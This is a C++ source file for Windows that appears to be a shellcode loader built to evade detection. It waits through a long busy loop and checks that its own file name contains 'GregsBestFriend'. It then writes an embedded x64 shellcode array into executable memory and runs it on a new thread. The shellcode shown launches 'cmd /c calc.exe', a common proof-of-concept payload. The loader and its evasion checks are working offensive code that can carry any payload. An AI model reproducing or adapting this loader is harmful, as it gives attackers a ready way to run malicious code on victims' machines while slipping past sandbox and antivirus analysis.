#include "Windows.h"
#include "stdio.h"
#include <iostream>
#include <string>
#include <regex>

#define MAX_OP 89888996 // Define a constant MAX_OP with a value of 89888996
void shellcode(); // Declare the shellcode function

using namespace std;

int main(int argc, char *argv[])
{
    char path [MAX_PATH]; // Declare a character array to hold the file path
    int cpt = 0; // Initialize an integer variable cpt to 0
    int i = 0; // Initialize an integer variable i to 0
    for (i = 0; i < MAX_OP; i++) // Loop MAX_OP times and increment cpt each time
    {
        cpt++;
    }
    if (cpt == MAX_OP) // Check if cpt is equal to MAX_OP
    {
        GetModuleFileNameA(NULL, path, MAX_PATH); // Get the file path of the current module
        regex str_expr ("(.*)(GregsBestFriend)(.*)"); // Define a regular expression pattern
        
        if (regex_match (path,str_expr)) { // Check if the file path matches the regular expression pattern
            shellcode(); // Call the shellcode function
        }
    }
    return 0; // Return 0 to indicate successful program execution
}

void shellcode() // Define the shellcode function
{
    //unsigned char shellcode[] = "\xeb\x27\x5b\x53\x5f\xb0"; // Define an array of bytes to hold the shellcode
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x6d\x64\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65"
        "\x78\x65\x00";
    HANDLE processHandle; // Declare a HANDLE variable to hold the process handle
    HANDLE remoteThread; // Declare a HANDLE variable to hold the remote thread handle
    PVOID remoteBuffer; // Declare a PVOID variable to hold the remote buffer address

    DWORD pnameid = GetCurrentProcessId(); // Get the ID of the current process
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid); // Open the current process with all access rights
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // Allocate memory in the current process for the shellcode
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); // Write the shellcode to the remote buffer
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); // Create a remote thread to execute the shellcode
    CloseHandle(processHandle); // Close the process handle
    system("pause"); // Pause the program execution to allow the user to see the output
    //return 0; // The function does not return a value
}
